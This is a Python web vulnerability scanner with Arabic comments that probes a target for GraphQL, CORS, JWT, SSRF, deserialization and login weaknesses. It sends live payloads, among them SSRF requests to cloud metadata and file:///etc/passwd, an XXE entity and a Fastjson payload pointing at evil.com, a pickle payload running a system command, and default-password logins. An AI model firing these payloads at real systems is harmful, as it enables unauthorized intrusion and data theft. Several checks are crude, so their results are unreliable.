#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Modern Vulnerabilities Exploit Module
الكشف عن الثغرات الحديثة والمتقدمة
المبرمج: SayerLinux
الإيميل: SaudiSayer@gmail.com
"""

import requests
import json
import re
import time
from urllib.parse import urljoin, urlparse
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class ModernVulnerabilities:
    """فئة للكشف عن الثغرات الحديثة"""
    
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = timeout
        
        # نتائج الفحص
        self.results = {
            'target': target,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'exploits': []
        }
    
    def check_graphql_injection(self):
        """الكشف عن ثغرات GraphQL Injection"""
        try:
            graphql_endpoints = ['/graphql', '/api/graphql', '/graph', '/gql']
            
            for endpoint in graphql_endpoints:
                url = urljoin(f"http://{self.target}", endpoint)
                
                # اختبار Introspection Query
                introspection_query = {
                    "query": "{ __schema { types { name } } }"
                }
                
                try:
                    response = self.session.post(url, json=introspection_query, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        data = response.json()
                        if '__schema' in str(data):
                            self.results['vulnerabilities'].append({
                                'type': 'GraphQL Introspection Enabled',
                                'severity': 'Medium',
                                'description': f'GraphQL introspection is enabled on {endpoint}',
                                'endpoint': endpoint,
                                'exploit': 'Can reveal entire API schema'
                            })
                    
                    # اختبار Batching Attack
                    batch_query = [
                        {"query": "{ __typename }"},
                        {"query": "{ __typename }"},
                        {"query": "{ __typename }"}
                    ]
                    
                    response = self.session.post(url, json=batch_query, timeout=self.timeout)
                    if response.status_code == 200:
                        data = response.json()
                        if isinstance(data, list) and len(data) > 1:
                            self.results['vulnerabilities'].append({
                                'type': 'GraphQL Batching Enabled',
                                'severity': 'High',
                                'description': f'GraphQL batching is enabled on {endpoint}',
                                'endpoint': endpoint,
                                'exploit': 'Vulnerable to batching attacks and DoS'
                            })
                            
                except requests.exceptions.RequestException:
                    continue
                    
        except Exception as e:
            print(f"[-] Error checking GraphQL injection: {e}")
    
    def check_api_misconfiguration(self):
        """الكشف عن سوء إعدادات API"""
        try:
            api_endpoints = ['/api/v1', '/api/v2', '/api', '/rest', '/rest/api']
            
            for endpoint in api_endpoints:
                url = urljoin(f"http://{self.target}", endpoint)
                
                # اختبار CORS
                headers = {
                    'Origin': 'https://evil.com',
                    'Access-Control-Request-Method': 'GET',
                    'Access-Control-Request-Headers': 'X-Requested-With'
                }
                
                try:
                    # اختبار CORS preflight
                    response = self.session.options(url, headers=headers, timeout=self.timeout)
                    
                    if 'Access-Control-Allow-Origin' in response.headers:
                        allowed_origin = response.headers['Access-Control-Allow-Origin']
                        if allowed_origin == '*' or 'evil.com' in allowed_origin:
                            self.results['vulnerabilities'].append({
                                'type': 'CORS Misconfiguration',
                                'severity': 'Medium',
                                'description': f'CORS allows requests from any origin on {endpoint}',
                                'endpoint': endpoint,
                                'allowed_origin': allowed_origin
                            })
                    
                    # اختبار HTTP Methods
                    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']
                    allowed_methods = []
                    
                    for method in methods:
                        try:
                            response = self.session.request(method, url, timeout=2)
                            if response.status_code != 405:  # Method Not Allowed
                                allowed_methods.append(method)
                        except:
                            continue
                    
                    if len(allowed_methods) > 3:  # Too many methods allowed
                        self.results['vulnerabilities'].append({
                            'type': 'Excessive HTTP Methods',
                            'severity': 'Low',
                            'description': f'Too many HTTP methods allowed on {endpoint}',
                            'endpoint': endpoint,
                            'allowed_methods': allowed_methods
                        })
                        
                except requests.exceptions.RequestException:
                    continue
                    
        except Exception as e:
            print(f"[-] Error checking API misconfiguration: {e}")
    
    def check_jwt_vulnerabilities(self):
        """الكشف عن ثغرات JWT"""
        try:
            jwt_endpoints = ['/api/auth', '/api/login', '/auth', '/login', '/token']
            
            for endpoint in jwt_endpoints:
                url = urljoin(f"http://{self.target}", endpoint)
                
                try:
                    # محاولة تسجيل الدخول ببيانات وهمية
                    login_data = {
                        'username': 'admin',
                        'password': 'admin123'
                    }
                    
                    response = self.session.post(url, json=login_data, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        # البحث عن JWT tokens في الاستجابة
                        response_text = response.text
                        jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                        tokens = re.findall(jwt_pattern, response_text)
                        
                        if tokens:
                            for token in tokens[:3]:  # فحص أول 3 tokens فقط
                                # اختبار algorithm confusion attack
                                header = token.split('.')[0]
                                if 'HS256' in header or 'none' in header.lower():
                                    self.results['vulnerabilities'].append({
                                        'type': 'JWT Weak Algorithm',
                                        'severity': 'High',
                                        'description': f'JWT token uses weak algorithm on {endpoint}',
                                        'endpoint': endpoint,
                                        'token_sample': token[:50] + '...'
                                    })
                                
                                # اختبار missing signature
                                if token.endswith('.'):
                                    self.results['vulnerabilities'].append({
                                        'type': 'JWT No Signature',
                                        'severity': 'Critical',
                                        'description': f'JWT token without signature on {endpoint}',
                                        'endpoint': endpoint
                                    })
                    
                except requests.exceptions.RequestException:
                    continue
                    
        except Exception as e:
            print(f"[-] Error checking JWT vulnerabilities: {e}")
    
    def check_server_side_request_forgery(self):
        """الكشف عن SSRF ثغرات"""
        try:
            # اختبار endpoints التي قد تكون عرضة لـ SSRF
            ssrf_endpoints = [
                '/webhook', '/callback', '/fetch', '/proxy', '/upload',
                '/import', '/export', '/scan', '/webhook.php', '/api/webhook'
            ]
            
            ssrf_payloads = [
                'http://localhost:80',
                'http://127.0.0.1:80',
                'http://0.0.0.0:80',
                'http://169.254.169.254',  # AWS metadata
                'http://metadata.google.internal',  # GCP metadata
                'file:///etc/passwd',
                'dict://localhost:11211'  # Memcached
            ]
            
            for endpoint in ssrf_endpoints:
                url = urljoin(f"http://{self.target}", endpoint)
                
                for payload in ssrf_payloads:
                    try:
                        # اختبار GET parameter
                        params = {'url': payload, 'callback': payload, 'webhook': payload}
                        response = self.session.get(url, params=params, timeout=5)
                        
                        if response.status_code == 200:
                            response_time = response.elapsed.total_seconds()
                            if response_time > 2:  # Delay might indicate SSRF
                                self.results['vulnerabilities'].append({
                                    'type': 'Potential SSRF',
                                    'severity': 'High',
                                    'description': f'Potential SSRF vulnerability on {endpoint}',
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'response_time': response_time
                                })
                        
                        # اختبار POST data
                        data = {'url': payload, 'callback': payload, 'webhook': payload}
                        response = self.session.post(url, data=data, timeout=5)
                        
                        if response.status_code == 200:
                            response_time = response.elapsed.total_seconds()
                            if response_time > 2:
                                self.results['vulnerabilities'].append({
                                    'type': 'Potential SSRF',
                                    'severity': 'High',
                                    'description': f'Potential SSRF vulnerability on {endpoint} (POST)',
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'response_time': response_time
                                })
                                
                    except requests.exceptions.RequestException:
                        continue
                        
        except Exception as e:
            print(f"[-] Error checking SSRF: {e}")
    
    def check_insecure_deserialization(self):
        """الكشف عن ثغرات التحليل غير الآمن"""
        try:
            # اختبار endpoints التي قد تستخدم تحليلاً غير آمن
            deserialization_endpoints = [
                '/api/parse', '/api/process', '/api/execute', '/api/run',
                '/parse', '/process', '/execute', '/run', '/eval'
            ]
            
            # اختبار payloads مختلفة
            payloads = [
                # JSON
                '{"@type":"java.net.URL","val":"http://evil.com"}',
                '{"@class":"java.lang.Runtime"}',
                
                # XML
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]><foo>&xxe;</foo>',
                
                # PHP
                'a:1:{s:4:"test";s:10:"phpinfo();";}',
                
                # Python
                "cos\\nsystem\\n(S'echo vulnerable'\\ntR."
            ]
            
            for endpoint in deserialization_endpoints:
                url = urljoin(f"http://{self.target}", endpoint)
                
                for payload in payloads:
                    try:
                        headers = {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        }
                        
                        response = self.session.post(url, data=payload, headers=headers, timeout=5)
                        
                        if response.status_code == 500:
                            error_text = response.text.lower()
                            deserialization_keywords = [
                                'deserialization', 'unserialize', 'objectinputstream',
                                'pickle', 'yaml', 'json', 'xml', 'serialization'
                            ]
                            
                            if any(keyword in error_text for keyword in deserialization_keywords):
                                self.results['vulnerabilities'].append({
                                    'type': 'Potential Insecure Deserialization',
                                    'severity': 'Critical',
                                    'description': f'Potential insecure deserialization on {endpoint}',
                                    'endpoint': endpoint,
                                    'payload': payload[:100] + '...',
                                    'error_keywords': [k for k in deserialization_keywords if k in error_text]
                                })
                                
                    except requests.exceptions.RequestException:
                        continue
                        
        except Exception as e:
            print(f"[-] Error checking insecure deserialization: {e}")
    
    def check_broken_authentication(self):
        """الكشف عن مشاكل في المصادقة"""
        try:
            auth_endpoints = ['/login', '/auth', '/api/login', '/api/auth', '/signin']
            
            for endpoint in auth_endpoints:
                url = urljoin(f"http://{self.target}", endpoint)
                
                try:
                    # اختبار rate limiting
                    for i in range(10):
                        login_data = {
                            'username': f'admin{i}',
                            'password': 'wrongpassword123'
                        }
                        response = self.session.post(url, json=login_data, timeout=2)
                        
                        if response.status_code == 200 and i > 5:
                            # No rate limiting detected
                            self.results['vulnerabilities'].append({
                                'type': 'Missing Rate Limiting',
                                'severity': 'Medium',
                                'description': f'No rate limiting on authentication endpoint {endpoint}',
                                'endpoint': endpoint
                            })
                            break
                    
                    # اختبار weak password policy
                    weak_passwords = ['123456', 'password', 'admin', '12345678']
                    for password in weak_passwords:
                        login_data = {
                            'username': 'admin',
                            'password': password
                        }
                        response = self.session.post(url, json=login_data, timeout=2)
                        
                        if response.status_code == 200:
                            self.results['vulnerabilities'].append({
                                'type': 'Weak Password Policy',
                                'severity': 'Medium',
                                'description': f'Weak passwords accepted on {endpoint}',
                                'endpoint': endpoint,
                                'weak_password': password
                            })
                            break
                            
                except requests.exceptions.RequestException:
                    continue
                    
        except Exception as e:
            print(f"[-] Error checking broken authentication: {e}")
    
    def run_modern_scan(self):
        """تشغيل فحص الثغرات الحديثة"""
        print("[*] بدء فحص الثغرات الحديثة...")
        
        self.check_graphql_injection()
        self.check_api_misconfiguration()
        self.check_jwt_vulnerabilities()
        self.check_server_side_request_forgery()
        self.check_insecure_deserialization()
        self.check_broken_authentication()
        
        print("[+] تم الانتهاء من فحص الثغرات الحديثة")
        return self.results
    
    def generate_report(self):
        """إنشاء تقرير بالثغرات المكتشفة"""
        print(f"\n=== تقرير الثغرات الحديثة ===")
        print(f"الهدف: {self.target}")
        print(f"وقت الفحص: {self.results['scan_time']}")
        
        if self.results['vulnerabilities']:
            print(f"\n[!] تم العثور على {len(self.results['vulnerabilities'])} ثغرة:")
            for vuln in self.results['vulnerabilities']:
                severity = vuln.get('severity', 'Unknown')
                severity_symbol = {
                    'Critical': '🔴',
                    'High': '🟠',
                    'Medium': '🟡',
                    'Low': '🟢',
                    'Info': '🔵'
                }.get(severity, '⚪')
                
                print(f"\n{severity_symbol} {vuln['type']} ({severity})")
                print(f"   الوصف: {vuln['description']}")
                if 'endpoint' in vuln:
                    print(f"   النقطة: {vuln['endpoint']}")
        else:
            print("\n[+] لم يتم العثور على ثغرات حديثة")
        
        return self.results

# دالة رئيسية للاختبار
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) != 2:
        print("الاستخدام: python modern_vulnerabilities.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = ModernVulnerabilities(target)
    
    try:
        results = scanner.run_modern_scan()
        scanner.generate_report()
        
        # حفظ النتائج في ملف JSON
        import json
        with open(f'modern_vulns_{target}.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print(f"\n[+] تم حفظ النتائج في ملف modern_vulns_{target}.json")
        
    except KeyboardInterrupt:
        print("\n[!] تم إيقاف الفحص")
    except Exception as e:
        print(f"[!] خطأ: {e}")